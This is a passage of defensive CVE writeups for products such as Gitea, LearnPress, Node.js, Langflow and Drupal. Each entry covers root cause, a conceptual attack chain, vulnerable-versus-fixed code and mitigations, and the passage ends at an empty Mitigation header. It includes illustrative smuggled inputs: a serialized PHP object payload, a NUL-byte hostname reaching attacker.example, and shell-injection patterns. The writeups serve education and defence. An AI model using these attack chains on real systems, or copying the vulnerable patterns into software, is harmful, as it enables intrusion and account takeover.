  1. The attacker creates a fresh libp2p identity — never enrolled, no biscuit. Nodes ship bound to 0.0.0.0 with public DHT discovery, so the node is dialable over the network.
  2. They open the /libp2p-http ingress stream and POST a JSON-RPC tools/call to /mcp/<service>/ naming a deny-listed tool (e.g. delete_tables).
  3. The ingress invokes the backend handler directly: HTTP 200 and the tool executes. The identical call over the biscuit-gated MCP path is rejected with Authorization failed.
  4. For command/stdio-backed MCP services, the call drives the backend subprocess — attacker-controlled tool invocation, up to remote code execution where the backend exposes it.

For CVE-2026-103091: fetch /info, obtain any valid token from the project's OIDC provider, POST it to /register, and you are a full mesh member — the wildcard policy then authorizes every tool on every node.

The accompanying poc.py demonstrates the pattern safely: a request dispatcher that routes around the auth gate versus one that enforces it on every path, plus an enrollment check that rejects unapproved members versus the auto-enroll default. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update sam-node to v0.1.0-alpha.3 or later and the control plane to v0.1.0-alpha.9 or later.
  • Replace the wildcard default policy with least-privilege allowed_services/allowed_targets per node.
  • Require enrollment approval: validate OIDC claims (email, domain, group) and enforce a ban check keyed on something stronger than a regenerable peer ID.
  • Block libp2p ports at the network edge; do not rely on the mesh's shipped 0.0.0.0 binds in untrusted networks.
  • Rotate any mesh credentials issued while the flaws were exposed and audit tool-invocation logs for calls from un-enrolled peers.

docs.title: CVE-2026-103314 — RHACS SAML Assertion Replay (HIGH 7.4)
docs.text: Field Detail Severity HIGH (CVSS 3.1: 7.4) Product Red Hat Advanced Cluster Security for Kubernetes (RHACS) — Central Type Authentication bypass by capture-replay (CWE-294) Attack vector Network

docs.title: Affected versions
docs.text: Red Hat Advanced Cluster Security for Kubernetes — Central, with SAML authentication enabled, prior to the Red Hat security update addressing CVE-2026-103314. Consult the Red Hat security advisory linked below for the exact fixed release and upgrade to it.

docs.title: Root cause
docs.text: Central's SAML authentication ACS endpoint verifies that a received SAML response is validly signed and not expired, but it does not retain the assertion or response identifiers it has already processed. SAML assertions are meant to be single-use tickets; without a used-ID cache, any valid, unexpired response can be submitted any number of times, and each submission is honored as if it were a brand-new login.

docs.title: Proof of concept
docs.text:
Conceptual attack chain only (educational):

  1. The victim authenticates once via SAML SSO; the IdP returns a signed SAML response containing an assertion with a unique ID and an expiry time.
  2. The attacker obtains a copy of that valid, still-unexpired signed response (e.g. from logs, a proxy capture, or a compromised endpoint).
  3. The attacker re-submits the identical response to Central's SAML ACS endpoint.
  4. Central validates the signature and expiry, finds nothing preventing reuse, and issues a fresh authentication token.
  5. Steps 3–4 are repeated; each replay yields another distinct token for the mapped identity.

Vulnerable vs fixed pattern:

# VULNERABLE: signature + expiry only, no replay check
def handle_saml_response(resp):
    if verify_signature(resp) and not expired(resp):
        return issue_token(resp.identity)   # replay accepted!

# FIXED: single-use assertion/response ID cache with expiry
def handle_saml_response_fixed(resp):
    if not verify_signature(resp) or expired(resp):
        return reject("invalid")
    if resp.id in seen_ids:                 # already redeemed?
        return reject("replay detected")
    seen_ids.add(resp.id, ttl=resp.expiry)   # remember until expiry
    return issue_token(resp.identity)

This is a conceptual illustration. It is not a working exploit and must not be used against systems you do not own or administer.

docs.title: Mitigation
docs.text:
• Upgrade Central to the RHACS release carrying Red Hat's fix for CVE-2026-103314 (see the advisory below) and revoke existing sessions.
  • Rotate any Central tokens or credentials that could have been minted from replayed responses.
  • Monitor Central/SAML logs for duplicate assertion or response IDs — the same ID appearing more than once is a replay indicator.
  • Restrict and instrument the SAML ACS endpoint; treat captured SAML responses as sensitive material.

docs.title: CVE-2026-104627 — Gitea: One-Click Account Takeover via OpenID Linking
docs.text:
Field Value Severity High — estimated CVSS 8.4 (NVD score not yet published at time of writing; see note below) Product Gitea (self-hosted git service) Type Improper Authentication (CWE-287) + Cross-Site Request Forgery (CWE-352) Vector Network, no attacker account needed, one victim click → full session as victim (MFA bypassed)

Scoring note: this CVE was disclosed on 2026-10-18 and had no published CVSS at the time this writeup was made. The 8.4 estimate follows CVSS v3.1 for AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N: an account-takeover that bypasses the victim's TOTP/WebAuthn. Treat it as an editorial estimate, not an official score.

docs.title: Affected versions
docs.text: Gitea versions before 28.2.0. Fixed in 28.2.0 (released 2026-10-18). This was the headline flaw of a 12-CVE security batch disclosed with that release — including CVE-2026-109553 (SSH certificate principal confusion that could also impersonate users) and CVE-2026-105964 (Actions artifact memory exhaustion).

docs.title: Root cause
docs.text:
The OpenID association callback in the security settings accepted a positive OpenID 2.0 assertion without checking that the signed-in user had actually started a linking flow. Because OpenID 2.0 permits unsolicited assertions, an attacker-controlled OpenID provider could answer the callback on behalf of a victim who merely opened a crafted link — and Gitea attached the attacker's identity to whichever account was signed in.

Worse, the follow-up sign-in through OpenID login never runs the local TOTP/WebAuthn checks, so the attacker logs in as the victim with no password and no second factor.

// Simplified vulnerable pattern (routers/web/user/setting/security/openid.go)
func settingsOpenIDVerify(ctx) {
    assertion := parse(ctx.Request.URL)      // attacker-influenced callback
    id := openid.Verify(assertion)           // signed? yes — provider is the attacker's
    models.AddUserOpenID(ctx.Doer.ID, id)    // who started this linking? nobody asked
}

The fix binds each linking attempt to the initiating session with a short-lived, single-use state value; callbacks without a matching pending transaction are rejected even if the assertion verifies.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker sets up their own OpenID 2.0 provider and an unused identifier.
  2. They send the victim a crafted link to Gitea's settings security callback.
  3. The victim, signed in, opens the link; the attacker's provider returns a valid signed assertion.
  4. Gitea links the attacker's OpenID identity to the victim's account.
  5. The attacker signs in through OpenID login as the victim — TOTP/WebAuthn are never prompted.

The accompanying poc.py in this folder demonstrates the pattern safely: a mock callback that accepts an assertion without a pending-link record versus a fixed callback that requires a session-bound state token. It runs entirely offline against synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update Gitea to 28.2.0 or later immediately.
  • Audit linked OpenID identities on all accounts (user_open_id mappings).
  • Disable OpenID sign-in if you do not use it.
  • Review admin sessions and rotate tokens/SSH keys for high-value accounts.
  • As general hygiene: keep DISABLE_REGISTRATION on unless you need open sign-ups, and isolate Actions runners from internal networks.

docs.title: CVE-2026-104736 — LearnPress Unauthenticated PHP Object Injection
docs.text: Field Detail Severity Critical 9.8 (CVSS 3.1) Product LearnPress WordPress LMS plugin, up to and including 4.4.10 Type PHP Object Injection via deserialization of untrusted input (CWE-502) Attack vector Network · unauthenticated · checkout-email parameter in the checkout AJAX action

docs.title: Affected versions
docs.text: LearnPress ≤ 4.4.10. Fixed in 4.4.11.

docs.title: Root cause
docs.text:
During checkout, the checkout-email request parameter is passed through sanitize_text_field(). That function strips HTML tags and invalid UTF-8, but it does not strip PHP serialized-object syntax such as O:8:"EvilClass":0:{}.

The value is stored in the LearnPress session table and, on subsequent requests, LP_Session_Handler::get() feeds it into LP_Helper::maybe_unserialize() → unserialize() without an allowed_classes restriction. The attacker's serialized object is instantiated inside the WordPress process — no login required.

docs.title: Proof of concept
docs.text:
The attack chain, conceptually:

  1. Attacker POSTs to the checkout AJAX action with checkout-email set to a serialized PHP object.
  2. sanitize_text_field() lets the payload through untouched; it is stored in the session table.
  3. On the next request, unserialize() instantiates the attacker's class. Depending on which gadget classes the installed plugins expose, this leads to arbitrary file deletion, file writes, or remote code execution.

A public PoC is already circulating — assume active exploitation. See poc.py for an educational illustration of the vulnerable vs. fixed pattern (simplified, safe demo only).

docs.title: Mitigation
docs.text:
• Update LearnPress to 4.4.11 or newer immediately.
  • If you cannot update yet: block the checkout AJAX action at the firewall/WAF and inspect the session table for anomalous rows.
  • Long term: never unserialize() untrusted input; use allowed_classes => false or JSON.

Educational only. Only ever test in controlled environments you own.

docs.title: Azure Pipelines: Command Injection Lets a Stranger Run Code in Your Builds
docs.text: Educational material only. Do not use against systems you do not own or have explicit permission to test. | | | |---|---| | CVE | CVE-2026-105014 | | Severity | Critical — CVSS 9.1 (v3.1) | | Product | Azure Pipelines | | Type | Command injection / improper neutralization of special elements in a command (CWE-77) | | Attack vector | Unauthorized remote attacker smuggles shell metacharacters through pipeline input → code execution over the network |

docs.title: Affected versions
docs.text: Azure Pipelines. Apply the Microsoft security update.

docs.title: Root cause
docs.text:
Pipeline input was interpolated into a shell command without neutralizing special elements. Data became code: a quote, a semicolon, or a subshell expression broke out of the intended command and the pipeline executed the attacker's payload with its own privileges:

# Simplified vulnerable pattern
os.system(f"deploy --env {user_env}")   # BUG: input becomes shell syntax

# Simplified fixed pattern
subprocess.run(["deploy", "--env", user_env], shell=False)  # data stays data
Build systems are high-value targets: they hold production credentials and run with broad permissions. Never let untrusted input reach a shell.

docs.title: Proof of concept
docs.text:
1. Attacker finds pipeline input that flows into a shell command (variable, parameter, webhook payload).
  2. Attacker injects shell metacharacters — quotes, semicolons, command substitution.
  3. The pipeline interpolates the input into the command line unescaped.
  4. The runner executes the attacker's commands with the pipeline's permissions.
  5. Remote code execution inside your CI/CD — and everything it can reach.

See poc.py — a safe, fully synthetic demo of the vulnerable vs. fixed pattern. data must never become shell syntax: the demo contrasts string interpolation into a shell with argument-vector execution.

docs.title: Mitigation
docs.text:
• Apply the Microsoft security update for Azure Pipelines immediately.
  • Audit recent pipeline runs for unexpected commands or exfiltration.
  • Never interpolate variables into shell — use argument vectors, and pin task versions.
  • Scope pipeline identities to least privilege; treat build agents as untrusted.

docs.title: CVE-2026-105299 — Pingora: HTTP/1 Upstream Path Forwards Client-Controlled Hop-by-Hop Headers
docs.text: Field Value Severity High — CVSS 8.7 Product pingora-proxy before 0.9.0 — HTTP/1 upstream path (upstream_request_filter flow) Type Improper removal of hop-by-hop headers (CWE-1132) Vector Network, low complexity, no privileges, no user interaction → attacker-nominated headers pass through to chained intermediaries and strip application-added security headers; affects chained deployments where an HTTP/1 intermediary between Pingora and the origin honors Connection (e.g. Go's net/http)

docs.title: Affected versions
docs.text: • pingora-proxy before 0.9.0. Fixed in 0.9.0.

docs.title: Root cause
docs.text:
The HTTP/1 upstream path passes the downstream request through upstream_request_filter and writes it upstream without removing the client's Connection header, other hop-by-hop headers, or the headers Connection nominates — even though RFC 9110 §7.6.1 requires intermediaries to strip them. The HTTP/2 upstream path already removed Connection and related HTTP/1-specific headers; the HTTP/1 path was simply missed.

// Simplified vulnerable pattern (before 0.9.0)
fn send_upstream(req: &Request) {
    let req = upstream_request_filter(req);   // app adds X-Forwarded-For here
    upstream.write(req);                      // Connection + nominated headers still present!
}

// Simplified fixed pattern (0.9.0)
fn send_upstream(req: &Request) {
    let mut req = upstream_request_filter(req);
    req.strip_hop_by_hop();                   // Connection and nominated headers removed
    upstream.write(req);
}

docs.title: Proof of concept (conceptual)
docs.text:
1. The attacker sends a request with Connection: X-Forwarded-For.
  2. Pingora's filter adds the real client IP in X-Forwarded-For, then forwards the unmodified Connection header upstream.
  3. A chained HTTP/1 intermediary between Pingora and the origin honors Connection and strips X-Forwarded-For.
  4. The origin receives no client-IP header — IP allowlists, rate limits and geo rules go blind.

The accompanying poc.py demonstrates the pattern safely: a proxy that forgets to strip hop-by-hop headers versus one that does, against purely synthetic offline requests. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Upgrade pingora-proxy to 0.9.0 or later — the only real fix.
  • Audit chained intermediaries between Pingora and the origin; ensure each hop strips hop-by-hop headers per RFC 9110 §7.6.1.
  • Never trust client-IP headers across untrusted hops — validate X-Forwarded-For only from your own edge.
  • Test the header path in staging: send Connection-nominated headers and confirm the origin never sees them.

docs.title: Kubernetes Console Operator: Tenant Image + Cluster Keys = Cross-Tenant Kafka Takeover
docs.text: Field Value Severity Critical — CVSS 9.9 (v3.1) Product Kubernetes Console operator for Strimzi (Red Hat) Type Improper privilege management (CWE-269) — tenant-controlled image runs under cluster-wide ServiceAccount Vector Kubernetes tenant with create permission on Console custom resources sets spec.containers.api.spec.image to an arbitrary image → operator deploys it in a pod whose ServiceAccount is bound (ClusterRoleBinding) to cluster-wide Strimzi get/list/watch + patch → attacker's code reads the projected SA token → cross-tenant control plane access

docs.title: Affected versions
docs.text: Strimzi Console operator versions per Red Hat advisory. Apply the vendor fix; restrict Console CR creation meanwhile.

docs.title: Root cause
docs.text:
The operator lets a tenant name the container image in a Console custom resource, then schedules that image with a ServiceAccount bound via ClusterRoleBinding to a ClusterRole granting cluster-wide get/list/watch on all Strimzi CRDs (including KafkaUsers), patch on Kafkas and KafkaRebalances, plus cluster-monitoring-view. Untrusted input (the image) meets a trusted identity (the SA):

# Simplified vulnerable pattern
spec:
  containers:
    api:
      spec:
        image: attacker-controlled   # tenant chooses the image...
# ...and the operator runs it as a ServiceAccount with cluster-wide Strimzi
# get/list/watch + patch. The attacker's code reads the projected SA token.

# Simplified fixed pattern: the operator pins its own image and the binding
# grants only the namespaces the tenant legitimately manages.
spec:
  containers:
    api:
      spec:
        image: operator-pinned:v1.2.3   # tenant cannot choose
One YAML file, and the attacker's container lists Kafka users across every tenant.

docs.title: Proof of concept (conceptual)
docs.text:
1. Tenant with Console CR create permission applies a resource pointing spec.containers.api.spec.image at a malicious image.
  2. The operator pulls and runs it with the over-privileged ServiceAccount.
  3. The attacker's code reads the projected SA token from the pod.
  4. With cluster-wide Strimzi read+write, they control Kafka clusters, users, and rebalances across tenants.

The accompanying poc.py demonstrates the pattern safely: Operators must never run tenant-chosen images under elevated identities: pin images server-side and bind least privilege. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Apply the Red Hat fix for CVE-2026-105312 immediately.
  • Restrict who can create Console custom resources; audit running console pods for unexpected images.
  • Redesign the operator binding to least privilege; rotate anything the SA token could reach.

docs.title: CVE-2026-105482 — Node.js DNS: Invisible NUL Byte Silently Defeats Domain Allowlists
docs.text: Field Value Severity High — CVSS 7.4 (v3.1) Product Node.js — 26.x, 24.x, 22.x before the October 2026 security releases Type Improper check or handling of exceptional conditions (CWE-703/CWE-284) — NUL-byte truncation in DNS resolution Vector Attacker registers attacker.example → hands the app the hostname attacker.exampletrusted.example → the app's allowlist sees trusted.example and approves → dns.resolve*()/dns.reverse() pass the name to c-ares as a C string, which silently truncates at the NUL → the app resolves and connects to attacker.example

docs.title: Affected versions
docs.text: Node.js 26.x, 24.x, 22.x. Fixed in 22.23.4, 24.22.1, 26.12.1. (Incomplete fix of CVE-2026-48930, which only covered dns.lookup() and the net/tls host options.)

docs.title: Root cause
docs.text: The name crossed a representation boundary: JavaScript strings can contain NUL bytes, but the C library underneath treats NUL as end-of-string. Validation happened on the full JS string while resolution happened on the truncated C string. In real DNS a NUL byte is just another legal label character, so the validator and the resolver acted on two different names - with no error raised anywhere.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - allowlist sees the full string, resolver sees the prefix
const host = "attacker.example\0.trusted.example";
if (allowlistAllows(host)) {            // sees "...trusted.example" -> OK
  dns.resolve4(host, cb);               // c-ares gets "attacker.example"
}

// FIXED - reject control bytes before any validation or resolution
if (/[\0-\x1f]/.test(host)) throw new Error("invalid hostname");

The demo poc.py below models the truncation with synthetic strings - no DNS lookups are performed.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update Node.js to 22.23.4, 24.22.1, or 26.12.1. As defense in depth, reject hostnames containing NUL or other control bytes before validating or resolving them, and treat surprising DNS answers as hostile.

docs.title: CVE-2026-105483-group — Node.js TLS Hostname Verification Bypassed by Sneaky IP Spellings (2 CVEs)
docs.text:
Field Value Severity High — CVSS 7.4 (v3.0) x2 Product Node.js — 26.x, 24.x, 22.x before the October 2026 security releases Type Improper certificate validation (CWE-295) — hostname verification mismatch Vector Attacker obtains a certificate with a numeric DNS SAN (no IP SAN needed) → victim connects to a non-canonical IP spelling (fullwidth digits, leading-zero octal, hex/decimal forms) → tls.checkServerIdentity() normalizes the host differently from the OS resolver → the certificate is validated against the wrong name and accepted → man in the middle on the encrypted connection

Covers CVE-2026-105483 (fullwidth-digit host not recognized as IP), CVE-2026-106069 (leading-zero octet read as octal by URL rules but decimal by the OS).

docs.title: Affected versions
docs.text: Node.js 26.x, 24.x, 22.x (varies per CVE). Fixed in 22.23.4, 24.22.1, 26.12.1.

docs.title: Root cause
docs.text: Two parsers disagreed on what the hostname was. tls.checkServerIdentity() applied its own normalization (WHATWG URL rules, Unicode handling) while the actual connection went through the operating system resolver. A host like 0127.0.0.1 was validated as one IP (87.0.0.1, octal) while the socket connected to another (127.0.0.1, decimal). Identity checks are only meaningful when the checked identity and the connected identity are the same string.

docs.title: Proof of concept
docs.text:
The vulnerable pattern, simplified:

// VULNERABLE - normalization disagrees with the resolver
const host = "0127.0.0.1";            // user-supplied
const checked = urlNormalize(host);   // -> 87.0.0.1 (octal)
const connected = osResolve(host);    // -> 127.0.0.1 (decimal, e.g. macOS)
tls.checkServerIdentity(checked, cert); // cert for 87.0.0.1 accepted...
// ...but the socket talks to 127.0.0.1

// FIXED - canonicalize strictly, reject ambiguous spellings
const ip = strictParseIP(host);       // throws on non-canonical forms
tls.checkServerIdentity(ip, cert);

The demo poc.py below models the parser-disagreement with synthetic data - no TLS, no network, no certificates involved.

Educational material only. Do not use against systems you do not own or have explicit permission to test.

docs.title: Mitigation
docs.text: Update Node.js to 22.23.4, 24.22.1, or 26.12.1 (matching your release line). Audit outbound TLS connections that target IP literals, and reject non-canonical host spellings at input validation time.

docs.title: CVE-2026-105944 — Apache Pulsar Manager: Open Admin Creation Hands Out Superuser Accounts
docs.text: Field Value Severity Critical — CVSS 10.0 (v4.0) Product Apache Pulsar Manager — the web console for administering Apache Pulsar clusters Type Missing authentication for critical function (CWE-306) — the initial-administrator creation endpoint stays reachable without authentication, and proxied admin-API requests run with the console's own privileged credential Vector Unauthenticated remote attacker reaches the console → calls the open user-creation endpoint → mints a superuser account → logs in → full control of the Pulsar cluster (plus the console proxies admin API calls with its configured credential to an attacker-chosen destination)

docs.text: Pulsar Manager 0.3.0 and later (admin-creation issue); proxied-request issue affects 0.2.0 behavior as described. Upgrade to the patched release from the Apache Pulsar security page.

docs.title: Root cause
docs.text: The user-creation operation for the initial administrator was never gated behind authentication and remained available after initialization, so any network-reachable console would accept new superuser accounts. Separately, admin-API requests proxied through the console were not subject to the console's authentication and carried the console's configured cluster credential toward a requester-chosen destination.

docs.title: Proof of concept
docs.text:
The demo contrasts create_admin_vulnerable() (no auth check) with create_admin_fixed() (requires a valid session token) plus a proxied-request guard.

The poc.py file next to this writeup demonstrates the vulnerable pattern versus the fixed pattern as a safe, offline logic demo — no network, no shell, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now to the patched Pulsar Manager release.
  • Audit every exposed admin console; assume exposed ones are compromised and rotate credentials.
  • Rotate the credential the console uses against the Pulsar cluster.
  • Keep admin consoles on a private network behind authentication, never on the public internet.

docs.title: CVE-2026-107188 — Eptura Archibus: Unauthenticated File Upload to RCE (3-Bug Chain)
docs.text: Field Value Severity Critical — CVSS 9.6 (CVSS 3.1) Product Eptura Archibus (workplace management) Type Unrestricted Upload of File with Dangerous Type (CWE-434), chained with authentication bypass and database read Vector 3-bug chain disclosed together by Rapid7: DWR auth bypass (CVE-2026-107186) + arbitrary database read (CVE-2026-107187) + unrestricted file upload (CVE-2026-107188) — combined they yield unauthenticated remote code execution

docs.title: Affected versions
docs.text: Eptura Archibus before 2025.02. Fixed in 2025.02 (the vulnerable DWR method was moved to a REST API).

docs.title: Root cause
docs.text: Three weaknesses combine into one exploit chain. First, CVE-2026-107186 (CVSS 8.6): a Direct Web Remoting request with isPasswordUppercase as one call method and run-workflow-rule as the next runs workflow rules with no login — an authentication bypass. Second, CVE-2026-107187 (CVSS 8.5): a DWR request specifying a workflow rule reads any database details, including usernames and passwords — chainable with the bypass, still no login. Third, CVE-2026-107188 (CVSS 9.6): the report-export upload accepts any file contents with any extension, so uploading JSP code as .jspx and browsing to it makes the server execute it. Chained with the bypass, an unauthenticated attacker gets RCE.

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. Attacker sends an unauthenticated DWR request chaining isPasswordUppercase with run-workflow-rule — workflow rules run with no login (CVE-2026-107186).
  2. With that bypass, a second DWR request reads database credentials outright (CVE-2026-107187).
  3. Attacker uploads export-report files with any contents and any extension — JSP code as .jspx (CVE-2026-107188).
  4. Browsing to the uploaded file makes the server execute it — unauthenticated RCE.

The accompanying poc.py demonstrates the pattern safely: a vulnerable mock versus the fixed pattern. Fully offline, synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text: Upgrade to Eptura Archibus 2025.02 or later — all prior versions are affected. Rotate all credentials in the database (usernames/passwords were readable). Audit uploaded export files for unexpected extensions or contents.

docs.title: CVE-2026-107366 — Langflow: Any Authenticated User Can Delete, Rewrite, or Hijack Anyone's AI Chat Messages
docs.text: Field Value Severity High — CVSS 8.3 Product Langflow OSS (langflowai/langflow) Type Authorization Bypass Through User-Controlled Key (CWE-639) Vector Authenticated (low-privilege) → network, no user interaction

docs.title: Affected versions
docs.text: Langflow OSS 1.0.0 through 1.12.4. Fixed in 1.12.6 (security backports from 1.13.0).

docs.title: Root cause
docs.text:
Three message API endpoints accept a session_id or message_id from the request and operate on the referenced messages without verifying that the caller owns them. Authentication confirms who is calling, but nothing checks whether the message or session belongs to that user — a classic broken object-level authorization (BOLA) flaw. Supplying the identifier alone is treated as proof of ownership.

# Simplified vulnerable pattern
msg = db.get(request.msg_id)   # attacker-controlled key, trusted blindly
msg.delete()                   # no ownership check

# Fixed pattern
msg = db.get(request.msg_id)
assert msg.owner == current_user  # tie every object to its owner

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. An authenticated low-privilege user obtains another user's session_id.
  2. They send a message delete/update request carrying the victim's session ID.
  3. The endpoint trusts the ID — messages are bulk-deleted, content is overwritten with malicious prompts that poison AI replies, or the session ID is reassigned so the attacker inherits the whole conversation.

The accompanying poc.py in this folder demonstrates the pattern safely: a mock message store showing an ownership-blind handler versus a fixed handler that ties every message to its owner. It runs entirely offline against synthetic data — no exploit, no network calls.

docs.title: Mitigation
docs.text:
• Update Langflow to 1.12.6 or later immediately.
  • Restrict account creation to trusted users; Langflow's docs note tenant isolation is the operator's responsibility.
  • Never expose Langflow directly to the open internet; put authentication and an allow-list in front of it.
  • Audit message/session logs for requests carrying session IDs that don't belong to the caller, and rotate API keys on any instance that was exposed.

docs.title: CVE-2026-107436 — Strong Testimonials: PHP Object Injection Through Review Data
docs.text: Field Value Severity High — CVSS 8.8 Product Strong Testimonials WordPress reviews plugin Type Deserialization of Untrusted Data (CWE-502) Vector Unauthenticated, network → code execution via gadget chain (triggered at render time)

docs.title: Affected versions
docs.text: Strong Testimonials through 3.3.12. Fixed in versions past 3.3.12.

docs.title: Root cause
docs.text:
The plugin stores review data in serialized form and rebuilds it with PHP's unserialize() on every page view — from input the attacker can influence, with no signature or integrity check. unserialize() does not just parse data: it instantiates whatever classes the bytes describe and runs their magic methods (__wakeup, __destruct, …) on the server.

// Simplified vulnerable pattern
$stored = get_from_database();  // attacker-influenced review data
$review = unserialize($stored); // live objects rebuilt, methods fire

docs.title: Proof of concept (conceptual)
docs.text:
The attack chain is:

  1. The attacker crafts a serialized payload that chains together gadget classes already present in WordPress — a POP chain — and gets it into the data the plugin unserializes.
  2. A visitor (or the attacker) loads any page that renders testimonials.
  3. At render time the plugin unserializes the payload; the gadget chain fires, running the attacker's logic with the web server's privileges.

The accompanying poc.py demonstrates the pattern safely: a mock review store whose vulnerable renderer instantiates attacker-named classes from a payload, versus the fixed renderer that only accepts plain data and rejects class markers. Fully offline, synthetic data — no exploit, no network calls.

Depending on the gadgets available, the impact ranges from rewriting site options and planting files to full remote code execution — and every page view that renders testimonials can re-trigger it.

docs.title: Mitigation
docs.text:
• Update Strong Testimonials past 3.3.12 immediately.
  • Audit wp_options for unexpected changes (siteurl, admin users, active plugins).
  • Scan uploads and plugin folders for unfamiliar files.
  • Prefer json_decode() over unserialize() for stored data, and sign anything that must round-trip through storage.

docs.title: CVE-2026-107685 - req_llm WebSocket Skips TLS Certificate Verification
docs.text: Field Value Severity CRITICAL 9.1 Product agentjido req_llm (Elixir LLM client), before fix commits a389d71 and c7264fc Weakness CWE-295 Improper Certificate Validation Attack vector Network (on-path)

docs.title: Affected versions
docs.text: All versions of req_llm before the fix commits a389d71 and c7264fc. The OpenAI Responses, Realtime, and Codex WebSocket paths reach the vulnerable client. HTTP streaming (Finch) and the HTTP/2 duplex session (Mint) verify certificates and are not affected.

docs.title: Root cause
docs.text: ReqLLM.Streaming.WebSocketSession.Client.start/3 (lib/req_llm/streaming/web_socket_session/client.ex) starts WebSockex without any TLS options. WebSockex defaults to insecure mode (verify none), so the client accepts any server certificate, including attacker-forged ones. Additionally, the option allowlist silently drops caller-supplied certificate or SSL options, so an application cannot opt into verification. Encrypted TLS is therefore established with an unverified peer, and the authorization bearer token is sent straight through the attacker's connection.

docs.title: Proof of concept (conceptual, educational only)
docs.text:
An on-path attacker runs a transparent proxy that terminates the victim's WebSocket TLS handshake with a self-signed certificate:

  1. Victim app opens a WebSocket to the OpenAI streaming endpoint.
  2. Attacker's proxy intercepts the handshake and presents a forged certificate.
  3. The req_llm client never validates it, so the connection proceeds through the attacker.
  4. The proxy forwards traffic while logging the authorization header containing the API key or OAuth token.
  5. The attacker replays the stolen token against the real API for quota abuse, session reading, or stream tampering.

The illustrative snippet below shows the config contrast (pseudo-Elixir, not a working exploit):

# VULNERABLE (before fix): no TLS options passed, verify defaults to none
WebSockex.start(url, __MODULE__, state)  # certificate NOT verified

# FIXED: verification enabled, caller SSL options honored
WebSockex.start(url, __MODULE__, state, ssl_options: [verify: :verify_peer, cacerts: :public_key.cacerts_get()])

docs.title: Mitigation
docs.text:
• Upgrade req_llm past the fix commits so WebSocket TLS verification is enabled and caller-supplied SSL options are honored.
  • Pin your dependency versions and audit TLS settings on every WebSocket client in your dependency tree.
  • Rotate any API key or OAuth token that streamed through an affected version.

docs.title: CVE-2026-107858 — Google ADK: Any Website Could Hijack Your Local AI Agent
docs.text: Field Value Severity High — CVSS 7.2 (v4.0) Product Google Agent Development Kit (ADK) for Java — google-adk-dev 0.1.0–1.12.x and google-adk-maven-plugin 0.3.0–1.12.x dev web server (ADK Web) Type Missing authentication / missing origin validation in WebSocket and CORS defaults (CWE-306 / CWE-1385 / CWE-942) Vector Developer runs the ADK Web dev server locally (no auth) → visits a malicious web page while the server runs → page's JavaScript opens cross-origin WebSocket/REST calls to the local server (allowed origins default to *) → sends messages to the agent (triggering registered tools), streams agent responses, lists/reads/creates/deletes sessions and artifacts. Binding to localhost does not stop it — the requests originate from the developer's own browser

docs.title: Affected versions
docs.text: google-adk-dev 0.1.0 before 1.13.0 and google-adk-maven-plugin 0.3.0 before 1.13.0. Fixed in 1.13.0.

docs.title: Root cause
docs.text:
The dev server bound to localhost and assumed that meant local. But it had no authentication, and its WebSocket /run_live endpoint accepted connections from any origin (hardcoded setAllowedOrigins("*") through 1.5.0; default CORS origins of * in 1.6.0–1.12.0). Since 0.4.0 the REST API also returned Access-Control-Allow-Origin: *. A malicious page visited in the developer's browser could then drive the local agent:

# Simplified vulnerable pattern
websocket.set_allowed_origins(["*"])   # BUG: any website may connect
rest_api.add_header("Access-Control-Allow-Origin", "*")  # BUG

# Simplified fixed pattern
websocket.set_allowed_origins(["http://localhost:8000"])  # explicit trust
Localhost binding never authenticated the caller; the browser happily proxies cross-origin requests for any tab you open.

docs.title: Proof of concept (conceptual)
docs.text:
1. Developer starts the ADK Web dev server locally (no authentication).
  2. Developer visits a malicious web page in the same browser while the server runs.
  3. The page's JavaScript opens a cross-origin WebSocket to /run_live — accepted, origin "*".
  4. The page sends messages to the agent (triggering registered tools), streams responses, and lists/reads/deletes sessions and artifacts.

The accompanying poc.py demonstrates the pattern safely: local servers still need authentication and strict origin checks: the demo contrasts an allow-any origin policy with an explicit localhost-only allowlist. Offline, no server, no exploit.

docs.title: Mitigation
docs.text:
• Upgrade now: google-adk-dev / maven-plugin 1.13.0.
  • On 1.6.0–1.12.0, set adk.web.cors.origins to explicit trusted origins.
  • Treat dev servers as authenticated services — bind token auth even on localhost.
  • Never run dev servers with sensitive tools while browsing untrusted sites.

docs.title: CVE-2026-108097 — Remote Code Execution in Drupal Core Field UI
docs.text: Field Detail Severity Critical (Drupal 19/25) Product Drupal core — Field UI module (field_ui) Type Remote Code Execution Attack vector Unauthenticated — via contributed modules or custom code that expose the vulnerable table rendering CVE CVE-2026-108097 Advisory SA-CORE-2026-014 (2026-10-14)

docs.title: Affected versions
docs.text:
• Drupal >= 8.9.0 and < 10.6.19
  • Drupal >= 11.0.0 and < 11.3.19
  • Drupal >= 11.4.0 and < 11.4.10
  • Drupal >= 12.0.0-alpha1 and < 12.0.0-beta2

(Branches 8.x, 9.x, <= 10.5.x and <= 11.2.x are end-of-life and receive no patch.)

docs.title: Root cause
docs.text: Field UI builds administrative tables with Drupal's render system. Before the fix, each table row could carry a #region_callback property, and the module executed it as a PHP callable during pre-render without validating the callback. Drupal core alone never hands remote input to that code path — but contributed modules and custom code can render those tables from attacker-controlled data, and at least one known path requires no authentication. Reported by Drew Webber and Octavio Galland.

docs.title: Proof of concept
docs.text:
Educational illustration of the bug class only. No working exploit is provided. Test only in controlled environments against systems you own.

Conceptual attack chain:

  1. The attacker (no login) finds a contributed-module page that renders a Field UI admin table.
  2. The request smuggles a malicious PHP callable into the row's #region_callback.
  3. Field UI's pre-render step invokes it blindly → arbitrary PHP runs as the web-server user.

Simplified vulnerable vs. fixed pattern (see poc.py):

// VULNERABLE (simplified)
call_user_func($row['#region_callback']);

// FIXED (simplified): allow-list only
$allowed = ['field_ui_table_region'];
if (in_array($cb, $allowed, TRUE)) {
    call_user_func($cb);
}

docs.title: Mitigation
